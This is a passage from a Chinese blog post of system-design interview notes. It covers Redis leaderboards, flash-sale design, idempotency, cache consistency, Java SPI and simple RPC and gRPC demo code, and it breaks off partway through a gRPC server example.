有序集合 API 的掌握程度。\n\n也就是这个 API：\n- zinterstore/zunionstore destination numkeys key [key ...] [weights weight [weight ...]] [aggregate sum|min|max] 获取交集/并集\n    - zinterstore/zunionstore其实就是交集/并集\n    - destination 将交集/并集的结果保存到这个键中\n    - numkeys 需要做交集/并集的集合的个数\n    - key [key ...] 具体参与交集/并集的集合\n    - weights weight [weight ...] 每个参与计算的集合的权重。在做交集/并集计算时，每个集合中的 member 会把自己的 score 乘以这个权重，默认为 1。\n    - aggregate sum|min|max 对于各个集合中的相同元素是 sum(求和)、min(取最小值)还是max(取最大值)，默认为 sum。\n\n比如现在有一些数据\n```shell\nzadd sport:ranking:why:20210222 43243 why 2341 mx 8764 les 42321 skr\nzadd sport:ranking:why:20210223 57632 why 24354 mx 4231 les 43512 skr 5341 jay\nzadd sport:ranking:why:20210224 10026 why 12344 mx 54312 les 34531 skr 43512 jay\nzadd sport:ranking:why:20210225 54312 why 32451 mx 23412 les 21341 skr 56321 jay\nzadd sport:ranking:why:20210226 3212 why 63421 mx 53652 les 45621 skr 5723 jay\nzadd sport:ranking:why:20210227 5462 why 10158 mx 30169 les 48858 skr 66079 jay\nzadd sport:ranking:why:20210228 43553 why 4451 mx 7431 les 9563 skr 8232 jay\n```\n![](./2024/05/26/场景设计面试题/10.png)\n\n现在我们要求出最近 7 天的排行榜，就用下面这行命令，命令有点复杂，但是对着命令格式看，还是很清晰的：\n```shell\nzunionstore sport:ranking:why:last_seven_day 7 sport:ranking:why:20210222 sport:ranking:why:20210223 sport:ranking:why:20210224 sport:ranking:why:20210225 sport:ranking:why:20210226 sport:ranking:why:20210227 sport:ranking:why:20210228 weights 1 1 1 1 1 1 1 aggregate sum\n```\n![](./2024/05/26/场景设计面试题/11.png)\n\n上面用的是并集，如果我们的要求是对最近 7 天，每天都上传运动数据的人进行排序，就用交集来算。\n\n命令和上面的一致，只是把 zunionstore 修改为 zinterstore 即可。\n\n另外为了有对比，合并之后的队列名称也修改一下，命令如下：\n```shell\nzinterstore sport:ranking:why:last_seven_day_zinterstore 7 sport:ranking:why:20210222 sport:ranking:why:20210223 sport:ranking:why:20210224 sport:ranking:why:20210225 sport:ranking:why:20210226 sport:ranking:why:20210227 sport:ranking:why:20210228 weights 1 1 1 1 1 1 1 aggregate sum\n```\n![](./2024/05/26/场景设计面试题/12.png)\n\n知道最近 7 天的做法了，我们又有每一天数据，上一周、上一月、上个季度、这一年排行榜啥的不都是这个套路吗\n\n### 亿级用户排行榜\n\n#### 按段位分桶\n由于数据量比较大，所以需要类似于分成一个个小文件的思想去统计每一部分的数据\n\n比如游戏里的段位，统计国服前100，可以把王者、大师、砖石、铂金、黄金、白银、青铜 分为不同的桶，每个分段的人在不同的桶里(假设还是用zset存储用户的段位)\n那计算全服排名即可先计算在某个段位桶的排名x,再获取这个段位桶前的所有桶的大小y1,y2...yn，排名就计算出来了x+y1+y2....yn\n##### 计算top100\n分桶后，直接在段位最大的桶里计算top100即可\n#### 按积分分桶\n[0-5000] [5001-10000] .....[10000000-x]\n\n这种可能会出现热点问题，比如处于0-5000区间的人会非常多（可能很多人都是没有打排位）用户的落点其实并不是均匀的，那就需要通过其他预测算法去预估每个区间的人数了\n\n\n\n","source":"_posts/场景设计面试题.md","raw":"---\ntitle: 场景设计面试题\ndate: 2024-05-26 23:11:48\ntags: 场景设计\ncategories: 面试\n---\n\n\n\n\n## 有A、B两个大文件，每个文件几十G，而内存只有4G，其中A文件存放学号+姓名，而B文件存放学号+分数，要求生成文件C，存放姓名和分数。怎么实现？\n- hash(学号)%1000，A到a0....a1000,B到b0~b1000\n- 学号相同的人一定hash到相同序号的小文件\n- 加载序号相同的小文件（比如：读取a2和b2）用map储存再按姓名+分数写入C即可\n## 秒杀系统怎么设计\n### 秒杀存在的问题\n- 高并发、瞬间请求量极大\n- 黄牛、黑客恶意请求\n- 链接暴露问题\n- 数据库压力问题\n- 库存不足和超卖问题\n### 如何解决这些问题\n- 页面静态化\n    - 秒杀活动的页面，大多数内容都是固定不变的，如商品名称，商品图片等等，可以对活动页面做静态化处理，减少访问服务端的请求。秒杀用户会分布在全国各地，有的在上海，有的在深圳，地域相差很远，网速也各不相同。为了让用户最快访问到活动页面，可以使用CDN（Content Delivery Network，内容分发网络）。CDN可以让用户就近获取所需内容。\n- 按钮至灰控制\n    - 秒杀活动开始前，按钮一般需要置灰的。只有时间到了，才能变得可以点击。这是防止，秒杀用户在时间快到的前几秒，疯狂请求服务器，然后秒杀时间点还没到，服务器就自己挂了。\n- 服务单一职责\n    - 我们都知道微服务设计思想，也就是把各个功能模块拆分，功能那个类似的放一起，再用分布式的部署方式。\n    - 如用户登录相关的，就设计个用户服务，订单相关的就搞个订单服务，再到礼物相关的就搞个礼物服务等等。那么，秒杀相关的业务逻辑也可以放到一起，搞个秒杀服务，单独给它搞个秒杀数据库。\n    - 服务单一职责有个好处：如果秒杀没抗住高并发的压力，秒杀库崩了，服务挂了，也不会影响到系统的其他服务。\n- 秒杀链接加盐\n    - 链接如果明文暴露的话，会有人获取到请求Url，提前秒杀了。因此，需要给秒杀链接加盐。可以把URL动态化，如通过MD5加密算法加密随机的字符串去做url。\n- 限流\n    - 一般有两种方式限流：nginx限流和redis限流。\n    - 为了防止某个用户请求过于频繁，我们可以对同一用户限流；\n    - 为了防止黄牛模拟几个用户请求，我们可以对某个IP进行限流；\n    - 为了防止有人使用代理，每次请求都更换IP请求，我们可以对接口进行限流。\n    - 为了防止瞬时过大的流量压垮系统，还可以使用阿里的Sentinel、Hystrix组件进行限流。\n- 分布式锁\n    - 可以使用redis分布式锁解决超卖问题。\n    - 使用Redis的SET EX PX NX + 校验唯一随机值,再删除释放锁。\n    - 为了更严谨，一般也是用lua脚本代替。lua脚本如下：\n- MQ异步处理\n    - 如果瞬间流量特别大，可以使用消息队列削峰，异步处理。用户请求过来的时候，先放到消息队列，再拿出来消费。\n- 限流&降级&熔断\n    - 限流，就是限制请求，防止过大的请求压垮服务器；\n    - 降级，就是秒杀服务有问题了，就降级处理，不要影响别的服务；\n    - 熔断，服务有问题就熔断，一般熔断降级是一起出现。\n## 产品上线出问题怎么定位错误\n- 复现问题\n- top jstack\n## 大量并发查询用户商品信息，MySQL压力大查询慢，保证速度怎么优化方案\n读写分离\n## 海量日志数据，提取出某日访问百度次数最多的那个IP。\n- 可以考虑采用“分而治之”的思想，按照IP地址的Hash(IP)%1024值，把海量IP日志分别存储到1024个小文件中。这样，每个小文件最多包含4MB个IP地址\n- 对于每一个小文件，可以构建一个IP为key，出现次数为value的Hash map，同时记录当前出现次数最多的那个IP地址\n- 可以得到1024个小文件中的出现次数最多的IP，再依据常规的排序算法得到总体上出现次数最多的IP；\n## 给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？\n### 方案1\n- 遍历文件a，对每个url求取hash(url)%1000，然后根据所取得的值将url分别存储到1000个小文件（记为a0,a1,...,a999）中。这样每个小文件的大约为300M。\n- 遍历文件b，采取和a相同的方式将url分别存储到1000小文件（记为b0,b1,...,b999）。这样处理后，所有可能相同的url都在对应的小文件（a0vsb0,a1vsb1,...,a999vsb999）中，不对应的小文件不可能有相同的url。然后我们只要求出1000对小文件中相同的url即可。\n- 求每对小文件中相同的url时，可以把其中一个小文件的url存储到hash_set中。然后遍历另一个小文件的每个url，看其是否在刚才构建的hash_set中，如果是，那么就是共同的url，存到文件里面就可以了。\n### 方案2\n如果允许有一定的误差，使用布隆过滤器\n## 一般内存不足而需要分析的数据又很大的问题都可以使用分治的思想，将数据hash(x)%1000分为小文件再分别加载小文件到内存中处理即可\n\n## 如何保证接口的幂等性\n\n### 什么是幂等性\n幂等性是系统服务对外一种承诺，承诺只要调用接口成功，外部多次调用对系统的影响是一致的。声明为幂等的服务会认为外部调用失败是常态，并且失败之后必然会有重试。\n\n### 什么情况下需要幂等\n\n以SQL为例：\n\n- SELECT col1 FROM tab1 WHER col2=2，无论执行多少次都不会改变状态，是天然的幂等。\n- UPDATE tab1 SET col1=1 WHERE col2=2，无论执行成功多少次状态都是一致的，因此也是幂等操作。\n- UPDATE tab1 SET col1=col1+1 WHERE col2=2，每次执行的结果都会发生变化，这种不是幂等的。\n- insert into user(userid,name) values(1,'a') 如userid为唯一主键，即重复操作上面的业务，只会插入一条用户数据，具备幂等性。\n    - 如userid不是主键，可以重复，那上面业务多次操作，数据都会新增多条，不具备幂等性。\n- delete from user where userid=1，多次操作，结果一样，具备幂等性\n\n### 如何保证幂等\n\n#### 1、token机制\n- 服务端提供了发送token的接口。我们在分析业务的时候，哪些业务是存在幂等问题的，就必须在执行业务前，先去获取token，服务器会把token保存到redis中。\n- 然后调用业务接口请求时，把token携带过去，一般放在请求头部。\n- 服务器判断token是否存在redis中，存在表示第一次请求，然后删除token,继续执行业务。\n- 如果判断token不存在redis中，就表示是重复操作，直接返回重复标记给client，这样就保证了业务代码，不被重复执行。\n\n**关键点 先删除token，还是后删除token。**\n\n后删除token：如果进行业务处理成功后，删除redis中的token失败了，这样就导致了有可能会发生重复请求，因为token没有被删除。这个问题其实是数据库和缓存redis数据不一致问题，后续会写文章进行讲解。\n\n先删除token：如果系统出现问题导致业务处理出现异常，业务处理没有成功，接口调用方也没有获取到明确的结果，然后进行重试，但token已经删除掉了，服务端判断token不存在，认为是重复请求，就直接返回了，无法进行业务处理了。\n\n先删除token可以保证不会因为重复请求，业务数据出现问题。出现业务异常，可以让调用方配合处理一下，重新获取新的token，再次由业务调用方发起重试请求就ok了。\n\n**token机制缺点**\n\n业务请求每次请求，都会有额外的请求（一次获取token请求、判断token是否存在的业务）。其实真实的生产环境中，1万请求也许只会存在10个左右的请求会发生重试，为了这10个请求，我们让9990个请求都发生了额外的请求。\n\n#### 2、乐观锁机制\n\n- 这种方法适合在更新的场景中，update t_goods set count = count -1 , version = version + 1 where good_id=2 and version = 1\n- 根据version版本，也就是在操作库存前先获取当前商品的version版本号，然后操作的时候带上此version号。我们梳理下，我们第一次操作库存时，得到version为1，调用库存服务version变成了2；但返回给订单服务出现了问题，订单服务又一次发起调用库存服务，当订单服务传如的version还是1，再执行上面的sql语句时，就不会执行；因为version已经变为2了，where条件就不成立。这样就保证了不管调用几次，只会真正的处理一次。\n- 乐观锁主要使用于处理读多写少的问题\n\n#### 3、唯一主键\n\n这个机制是利用了数据库的主键唯一约束的特性，解决了在insert场景时幂等问题。但主键的要求不是自增的主键，这样就需要业务生成全局唯一的主键。\n\n如果是分库分表场景下，路由规则要保证相同请求下，落地在同一个数据库和同一表中，要不然数据库主键约束就不起效果了，因为是不同的数据库和表主键不相关\n\n#### 4、防重表\n\n使用订单号orderNo做为去重表的唯一索引，把唯一索引插入去重表，再进行业务操作，且他们在同一个事务中。这个保证了重复请求时，因为去重表有唯一约束，导致请求失败，避免了幂等问题。这里要注意的是，去重表和业务表应该在同一库中，这样就保证了在同一个事务，即使业务操作失败了，也会把去重表的数据回滚。这个很好的保证了数据一致性。\n\n#### 5、唯一ID\n\n调用接口时，生成一个唯一id，redis将数据保存到集合中（去重），存在即处理过。\n\n## 缓存和数据库不一致问题\n### 更新缓存和更新数据库\n大部分观点认为，做缓存不应该是去更新缓存，而是应该删除缓存，然后由下个请求去去缓存，发现不存在后再读取数据库，写入缓存。观点引用：《分布式之数据库和缓存双写一致性方案解析》孤独烟\n\n原因一：线程安全角度同时有请求A和请求B进行更新操作，那么会出现（1）线程A更新了数据库（2）线程B更新了数据库（3）线程B更新了缓存（4）线程A更新了缓存这就出现请求A更新缓存应该比请求B更新缓存早才对，但是因为网络等原因，B却比A更早更新了缓存。这就导致了脏数据，因此不考虑。\n\n原因二：业务场景角度有如下两点：\n1. 如果你是一个写数据库场景比较多，而读数据场景比较少的业务需求，采用这种方案就会导致，数据压根还没读到，缓存就被频繁的更新，浪费性能。\n2. 如果你写入数据库的值，并不是直接写入缓存的，而是要经过一系列复杂的计算再写入缓存。那么，每次写入数据库后，都再次计算写入缓存的值，无疑是浪费性能的。显然，删除缓存更为适合。\n\n### 删缓存和更新数据库\n#### 先删缓存，再更新数据库\n该方案会导致请求数据不一致同时有一个请求A进行更新操作，另一个请求B进行查询操作。那么会出现如下情形:\n1. 请求A进行写操作，删除缓存\n2. 请求B查询发现缓存不存在\n3. 请求B去数据库查询得到旧值\n4. 请求B将旧值写入缓存\n5. 请求A将新值写入数据库上述情况就会导致不一致的情形出现。\n   而且，如果不采用给缓存设置过期时间策略，该数据永远都是脏数据。\n#### 先更新数据库，再删缓存\n这种情况不存在并发问题么？不是的。假设这会有两个请求，一个请求A做查询操作，一个请求B做更新操作，那么会有如下情形产生\n1. 缓存刚好失效\n2. 请求A查询数据库，得一个旧值\n3. 请求B将新值写入数据库\n4. 请求B删除缓存\n5. 请求A将查到的旧值写入缓存ok，如果发生上述情况，确实是会发生脏数据。 然而，发生这种情况的概率又有多少呢？发生上述情况有一个先天性条件，就是步骤（3）的写数据库操作比步骤（2）的读数据库操作耗时更短，才有可能使得步骤（4）先于步骤（5）。可是，大家想想，数据库的读操作的速度远快于写操作的（不然做读写分离干嘛，做读写分离的意义就是因为读操作比较快，耗资源少），因此步骤（3）耗时比步骤（2）更短，这一情形很难出现。\n\n先更新数据库，再删缓存依然会有问题，不过，问题出现的可能性会因为上面说的原因，变得比较低！(补充说明：我用了“先更新数据库，再删缓存”且不设过期时间策略，会不会有问题呢？由于先缓存和更新数据库不是原子的，如果更新了数据库，程序歇逼，就没删缓存，由于没有过期策略，就永远脏数据了。)所以，如果你想实现基础的缓存数据库双写一致的逻辑，那么在大多数情况下，在不想做过多设计，增加太大工作量的情况下，请先更新数据库，再删缓存!\n### 数据库和缓存数据强一致怎么办\n没有办法做到绝对的一致性，这是由CAP理论决定的，缓存系统适用的场景就是非强一致性的场景，所以它属于CAP中的AP。所以，我们得委曲求全，可以去做到BASE理论中说的最终一致性。\n\n大佬们给出了到达最终一致性的解决思路，主要是针对上面两种双写策略（先删缓存，再更新数据库/先更新数据库，再删缓存）导致的脏数据问题，进行相应的处理，来保证最终一致性。\n\n#### 缓存延时双删\n步骤\n1. 先删除缓存\n2. 再写数据库\n3. 休眠500毫秒（根据具体的业务时间来定）\n4. 再次删除缓存。\n\n#### 那么，这个休眠500毫秒怎么确定的，具体该休眠多久呢？\n\n针对上面的情形，读者应该自行评估自己的项目的读数据业务逻辑的耗时。然后写数据的休眠时间则在读数据业务逻辑的耗时基础上，加几百ms即可。这么做的目的，就是确保读请求结束，写请求可以删除读请求造成的缓存脏数据。\n\n\n#### 如果你用了mysql的读写分离架构怎么办？\n\nok，在这种情况下，造成数据不一致的原因如下，还是两个请求，一个请求A进行更新操作，另一个请求B进行查询操作。\n1. 请求A进行写操作，删除缓存\n2. 请求A将数据写入数据库了，\n3. 请求B查询缓存发现，缓存没有值\n4. 请求B去从库查询，这时，还没有完成主从同步，因此查询到的是旧值\n5. 请求B将旧值写入缓存\n6. 数据库完成主从同步，从库变为新值上述情形，就是数据不一致的原因。还是使用双删延时策略。只是，睡眠时间修改为在主从同步的延时时间基础上，加几百ms。\n\n#### 采用这种同步淘汰策略，吞吐量降低怎么办？\n\nok，那就将第二次删除作为异步的。自己起一个线程，异步删除。这样，写的请求就不用沉睡一段时间后了，再返回。这么做，加大吞吐量。\n\n#### 删缓存失败了怎么办：重试机制\n看似问题都已经解决了，但其实，还有一个问题没有考虑到，那就是删除缓存的操作，失败了怎么办？比如延时双删的时候，第二次缓存删除失败了，那不还是没有清除脏数据吗？解决方案就是再加上一个重试机制，保证删除缓存成功\n\n流程如下所示\n1. 更新数据库数据；\n2. 缓存因为种种问题删除失败\n3. 将需要删除的key发送至消息队列\n4. 自己消费消息，获得需要删除的key\n5. 继续重试删除操作，直到成功然而，\n\n该方案有一个缺点，对业务线代码造成大量的侵入。\n\n于是有了方案二，在方案二中，启动一个订阅程序去订阅数据库的binlog，获得需要操作的数据。在应用程序中，另起一段程序，获得这个订阅程序传来的信息，进行删除缓存操作\n\n#### binlog\n流程如下所示\n1. 更新数据库数据\n2. 数据库会将操作信息写入binlog日志当中\n3. 订阅程序提取出所需要的数据以及key\n4. 另起一段非业务代码，获得该信息\n5. 尝试删除缓存操作，发现删除失败\n6. 将这些信息发送至消息队列\n7. 重新从消息队列中获得该数据，重试操作。\n\n## 什么是SPI\nSPI 全称为 (Service Provider Interface) ，是JDK内置的一种服务提供发现机制\n\n### SPI 实践\n接下来我们来如何来利用 SPI 实现刚才提到的可拔插 IOC 容器。\n\n既然刚才都提到了 SPI 的本质就是面向接口编程，所以自然我们首先需要定义一个接口：\n\n![SPI图](./2024/05/26/场景设计面试题/1.png)\n\n其中包含了一些 Bean 容器所必须的操作：注册、获取、释放 bean。\n\n为了让其他人也能实现自己的 IOC 容器，所以我们将这个接口单独放到一个 Module 中，可供他人引入实现。\n\n![](./2024/05/26/场景设计面试题/2.png)\n\n所以当我要实现一个单例的 IOC 容器时，我只需要新建一个 Module 然后引入刚才的模块并实现 CicadaBeanFactory 接口即可。\n\n当然其中最重要的则是需要在 resources 目录下新建一个 META-INF/services/top.crossoverjie.cicada.base.bean.CicadaBeanFactory 文件，文件名必须得是我们之前定义接口的全限定名（SPI 规范）。\n![](./2024/05/26/场景设计面试题/3.png)\n\n其中的内容便是我们自己实现类的全限定名：\n```shell\ntop.crossoverjie.cicada.bean.ioc.CicadaIoc\n```\n可以想象最终会通过这里的全限定名来反射创建对象。\n\n只不过这个过程 Java 已经提供 API 屏蔽掉了：\n```java\npublic static CicadaBeanFactory getCicadaBeanFactory() {\n    ServiceLoader<CicadaBeanFactory> cicadaBeanFactories = ServiceLoader.load(CicadaBeanFactory.class);\n    if (cicadaBeanFactories.iterator().hasNext()){\n        return cicadaBeanFactories.iterator().next() ;\n    }\n    return new CicadaDefaultBean();\n}\n```\n当 classpath 中存在我们刚才的实现类（引入实现类的 jar 包），便可以通过 java.util.ServiceLoader 工具类来找到所有的实现类（可以有多个实现类同时存在，只不过通常我们只需要一个）。\n\n一些都准备好之后，使用自然就非常简单了。\n```xml\n<dependency>\n    <groupId>top.crossoverjie.opensource</groupId>\n    <artifactId>cicada-ioc</artifactId>\n    <version>2.0.4</version>\n</dependency>\n```\n我们只需要引入这个依赖便能使用它的实现，当我们想换一种实现方式时只需要更换一个依赖即可。\n\n这样就做到了不修改一行代码灵活的可拔插选择 IOC 容器了。\n\nSPI 的一些其他应用\n\nMySQL 的驱动包也是利用 SPI 来实现自己的连接逻辑。\n\n![](./2024/05/26/场景设计面试题/4.png)\n\n总结来说：\n\n- 提供一个接口\n- 在resource下新建META-INF/services目录，在目录下新建接口的全限定名文件\n- 服务方实现接口\n- 调用ServiceLoad.load()\n\n## 什么是RPC？\nRPC（Remote Procedure Call）远程过程调用，简单的理解是一个节点请求另一个节点提供的服务\n\n1. 首先客户端需要告诉服务器，需要调用的函数，这里函数和进程ID存在一个映射，客户端远程调用时，需要查一下函数，找到对应的ID，然后执行函数的代码。\n2. 客户端需要把本地参数传给远程函数，本地调用的过程中，直接压栈即可，但是在远程调用过程中不再同一个内存里，无法直接传递函数的参数，因此需要客户端把参数转换成字节流，传给服务端，然后服务端将字节流转换成自身能读取的格式，是一个序列化和反序列化的过程。\n3. 数据准备好了之后，如何进行传输？网络传输层需要把调用的ID和序列化后的参数传给服务端，然后把计算好的结果序列化传给客户端，因此TCP层即可完成上述过程，gRPC中采用的是HTTP2协议。\n\n总结一下：\n```text\n// Client端 \n//    Student student = Call(ServerAddr, addAge, student)\n1. 将这个调用映射为Call ID。\n2. 将Call ID，student（params）序列化，以二进制形式打包\n3. 把2中得到的数据包发送给ServerAddr，这需要使用网络传输层\n4. 等待服务器返回结果\n5. 如果服务器调用成功，那么就将结果反序列化，并赋给student，年龄更新\n\n// Server端\n1. 在本地维护一个Call ID到函数指针的映射call_id_map，可以用Map<String, Method> callIdMap\n2. 等待客户端请求\n3. 得到一个请求后，将其数据包反序列化，得到Call ID\n4. 通过在callIdMap中查找，得到相应的函数指针\n5. 将student（params）反序列化后，在本地调用addAge()函数，得到结果\n6. 将student结果序列化后通过网络返回给Client\n```\n\n- 在微服务的设计中，一个服务A如果访问另一个Module下的服务B，可以采用HTTP REST传输数据，并在两个服务之间进行序列化和反序列化操作，服务B把执行结果返回过来。\n- 由于HTTP在应用层中完成，整个通信的代价较高，远程过程调用中直接基于TCP进行远程调用，数据传输在传输层TCP层完成，更适合对效率要求比较高的场景，RPC主要依赖于客户端和服务端之间建立Socket链接进行，底层实现比REST更复杂。\n\n### RPC demo\n客户端\n```java\npublic class RPCClient<T> {\n    public static <T> T getRemoteProxyObj(final Class<?> serviceInterface, final InetSocketAddress addr) {\n        // 1.将本地的接口调用转换成JDK的动态代理，在动态代理中实现接口的远程调用\n        return (T) Proxy.newProxyInstance(serviceInterface.getClassLoader(), new Class<?>[]{serviceInterface},\n                new InvocationHandler() {\n                    @Override\n                    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n                        Socket socket = null;\n                        ObjectOutputStream output = null;\n                        ObjectInputStream input = null;\n                        try{\n                            // 2.创建Socket客户端，根据指定地址连接远程服务提供者\n                            socket = new Socket();\n                            socket.connect(addr);\n\n                            // 3.将远程服务调用所需的接口类、方法名、参数列表等编码后发送给服务提供者\n                            output = new ObjectOutputStream(socket.getOutputStream());\n                            output.writeUTF(serviceInterface.getName());\n                            output.writeUTF(method.getName());\n                            output.writeObject(method.getParameterTypes());\n                            output.writeObject(args);\n\n                            // 4.同步阻塞等待服务器返回应答，获取应答后返回\n                            input = new ObjectInputStream(socket.getInputStream());\n                            return input.readObject();\n                        }finally {\n                            if (socket != null){\n                                socket.close();\n                            }\n                            if (output != null){\n                                output.close();\n                            }\n                            if (input != null){\n                                input.close();\n                            }\n                        }\n                    }\n                });\n    }\n}\n```\n服务端\n```java\npublic class ServiceCenter implements Server {\n\n    private static ExecutorService executor = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors());\n\n    private static final HashMap<String, Class> serviceRegistry = new HashMap<String, Class>();\n\n    private static boolean isRunning = false;\n\n    private static int port;\n\n\n    public ServiceCenter(int port){\n        ServiceCenter.port = port;\n    }\n\n\n    @Override\n    public void start() throws IOException {\n        ServerSocket server = new ServerSocket();\n        server.bind(new InetSocketAddress(port));\n        System.out.println(\"Server Start .....\");\n        try{\n            while(true){\n                executor.execute(new ServiceTask(server.accept()));\n            }\n        }finally {\n            server.close();\n        }\n    }\n\n    @Override\n    public void register(Class serviceInterface, Class impl) {\n        serviceRegistry.put(serviceInterface.getName(), impl);\n    }\n\n    @Override\n    public boolean isRunning() {\n        return isRunning;\n    }\n\n    @Override\n    public int getPort() {\n        return port;\n    }\n\n    @Override\n    public void stop() {\n        isRunning = false;\n        executor.shutdown();\n    }\n   private static class ServiceTask implements Runnable {\n        Socket client = null;\n\n        public ServiceTask(Socket client) {\n            this.client = client;\n        }\n\n        @Override\n        public void run() {\n            ObjectInputStream input = null;\n            ObjectOutputStream output = null;\n            try{\n                input = new ObjectInputStream(client.getInputStream());\n                String serviceName = input.readUTF();\n                String methodName = input.readUTF();\n                Class<?>[] parameterTypes = (Class<?>[]) input.readObject();\n                Object[] arguments = (Object[]) input.readObject();\n                Class serviceClass = serviceRegistry.get(serviceName);\n                if(serviceClass == null){\n                    throw new ClassNotFoundException(serviceName + \"not found!\");\n                }\n                Method method = serviceClass.getMethod(methodName, parameterTypes);\n                Object result = method.invoke(serviceClass.newInstance(), arguments);\n\n                output = new ObjectOutputStream(client.getOutputStream());\n                output.writeObject(result);\n            }catch (Exception e){\n                e.printStackTrace();\n            }finally {\n                if(output!=null){\n                    try{\n                        output.close();\n                    }catch (IOException e){\n                        e.printStackTrace();\n                    }\n                }\n                if (input != null) {\n                    try {\n                        input.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n                if (client != null) {\n                    try {\n                        client.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}\n\npublic class ServiceProducerImpl implements ServiceProducer{\n    @Override\n    public String sendData(String data) {\n        return \"I am service producer!!!, the data is \"+ data;\n    }\n}\n\npublic class RPCTest {\n    public static void main(String[] args) throws IOException {\n        new Thread(new Runnable() {\n            @Override\n            public void run() {\n                try {\n                    Server serviceServer = new ServiceCenter(8088);\n                    serviceServer.register(ServiceProducer.class, ServiceProducerImpl.class);\n                    serviceServer.start();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }).start();\n        ServiceProducer service = RPCClient.getRemoteProxyObj(ServiceProducer.class, new InetSocketAddress(\"localhost\", 8088));\n        System.out.println(service.sendData(\"test\"));\n    }\n}\n```\n\n## gRPC\n### gRPC与REST\n- REST通常以业务为导向，将业务对象上执行的操作映射到HTTP动词，格式非常简单，可以使用浏览器进行扩展和传输，通过JSON数据完成客户端和服务端之间的消息通信，直接支持请求/响应方式的通信。不需要中间的代理，简化了系统的架构，不同系统之间只需要对JSON进行解析和序列化即可完成数据的传递。\n- 但是REST也存在一些弊端，比如只支持请求/响应这种单一的通信方式，对象和字符串之间的序列化操作也会影响消息传递速度，客户端需要通过服务发现的方式，知道服务实例的位置，在单个请求获取多个资源时存在着挑战，而且有时候很难将所有的动作都映射到HTTP动词。\n- 正是因为REST面临一些问题，因此可以采用gRPC作为一种替代方案，gRPC 是一种基于二进制流的消息协议，可以采用基于Protocol Buffer的IDL定义grpc API,这是Google公司用于序列化结构化数据提供的一套语言中立的序列化机制，客户端和服务端使用HTTP/2以Protocol Buffer格式交换二进制消息。\n- gRPC的优势是，设计复杂更新操作的API非常简单，具有高效紧凑的进程通信机制，在交换大量消息时效率高，远程过程调用和消息传递时可以采用双向的流式消息方式，同时客户端和服务端支持多种语言编写，互操作性强；不过gRPC的缺点是不方便与JavaScript集成，某些防火墙不支持该协议。\n- 注册中心：当项目中有很多服务时，可以把所有的服务在启动的时候注册到一个注册中心里面，用于维护服务和服务器之间的列表，当注册中心接收到客户端请求时，去找到该服务是否远程可以调用，如果可以调用需要提供服务地址返回给客户端，客户端根据返回的地址和端口，去调用远程服务端的方法，执行完成之后将结果返回给客户端。这样在服务端加新功能的时候，客户端不需要直接感知服务端的方法，服务端将更新之后的结果在注册中心注册即可，而且当修改了服务端某些方法的时候，或者服务降级服务多机部署想实现负载均衡的时候，我们只需要更新注册中心的服务群即可。\n  ![](./2024/05/26/场景设计面试题/5.png)\n\n### demo\n这里使用SpringBoot+gRPC的形式实现RPC调用过程 项目结构分为三部分：client、grpc、server\n#### grpc\n![](./2024/05/26/场景设计面试题/6.png)\n```xml\n<dependency>\n      <groupId>io.grpc</groupId>\n      <artifactId>grpc-all</artifactId>\n       <version>1.12.0</version>\n </dependency>\n```\n```xml\n<build>\n        <extensions>\n            <extension>\n                <groupId>kr.motd.maven</groupId>\n                <artifactId>os-maven-plugin</artifactId>\n                <version>1.4.1.Final</version>\n            </extension>\n        </extensions>\n        <plugins>\n            <plugin>\n                <groupId>org.xolstice.maven.plugins</groupId>\n                <artifactId>protobuf-maven-plugin</artifactId>\n                <version>0.5.0</version>\n                <configuration>\n                    <pluginId>grpc-java</pluginId>\n                    <protocArtifact>com.google.protobuf:protoc:3.0.2:exe:${os.detected.classifier}</protocArtifact>\n                    <pluginArtifact>io.grpc:protoc-gen-grpc-java:1.2.0:exe:${os.detected.classifier}</pluginArtifact>\n                </configuration>\n                <executions>\n                    <execution>\n                        <goals>\n                            <goal>compile</goal>\n                            <goal>compile-custom</goal>\n                        </goals>\n                    </execution>\n                </executions>\n            </plugin>\n        </plugins>\n    </build>\n```\n创建.proto文件\n```protobuf\nsyntax = \"proto3\";   // 语法版本\n\n// stub选项\noption java_package = \"com.shgx.grpc.api\";\noption java_outer_classname = \"RPCDateServiceApi\";\noption java_multiple_files = true;\n\n// 定义包名\npackage com.shgx.grpc.api;\n\n// 服务接口定义，服务端和客户端都要遵守该接口进行通信\nservice RPCDateService {\n    rpc getDate (RPCDateRequest) returns (RPCDateResponse) {}\n}\n\n// 定义消息（请求）\nmessage RPCDateRequest {\n    string userName = 1;\n}\n\n// 定义消息（响应）\nmessage RPCDateResponse {\n    string serverDate = 1;\n}\n\n```\nmvn complie\n\n生成代码：\n![](./2024/05/26/场景设计面试题/7.png)\n\n#### client\n![](./2024/05/26/场景设计面试题/8.png)\n\n根据gRPC中的项目配置在client和server两个Module的pom.xml添加依赖\n```xml\n        <dependency>\n            <groupId>com.shgx</groupId>\n            <artifactId>grpc</artifactId>\n            <version>0.0.1-SNAPSHOT</version>\n            <scope>compile</scope>\n        </dependency>\n```\n编写GRPCClient\n```java\npublic class GRPCClient {\n    private static final String host = \"localhost\";\n    private static final int serverPort = 9999;\n\n    public static void main( String[] args ) throws Exception {\n        ManagedChannel managedChannel = ManagedChannelBuilder.forAddress( host, serverPort ).usePlaintext().build();\n        try {\n            RPCDateServiceGrpc.RPCDateServiceBlockingStub rpcDateService = RPCDateServiceGrpc.newBlockingStub( managedChannel );\n            RPCDateRequest rpcDateRequest = RPCDateRequest\n                    .newBuilder()\n                    .setUserName(\"shgx\")\n                    .build();\n            RPCDateResponse rpcDateResponse = rpcDateService.getDate( rpcDateRequest );\n            System.out.println( rpcDateResponse.getServerDate() );\n        } finally {\n            managedChannel.shutdown();\n        }\n    }\n}\n\n```\n#### server\n![](./2024/05/26/场景设计面试题/9.png)\n\n按照2.2.3 client的方式添加依赖\n\n创建RPCDateServiceImpl\n```java\npublic class RPCDateServiceImpl extends RPCDateServiceGrpc.RPCDateServiceImplBase{\n    @Override\n    public void getDate(RPCDateRequest request, StreamObserver<RPCDateResponse> responseObserver) {\n        RPCDateResponse rpcDateResponse = null;\n        Date now=new Date();\n        SimpleDateFormat simpleDateFormat = new 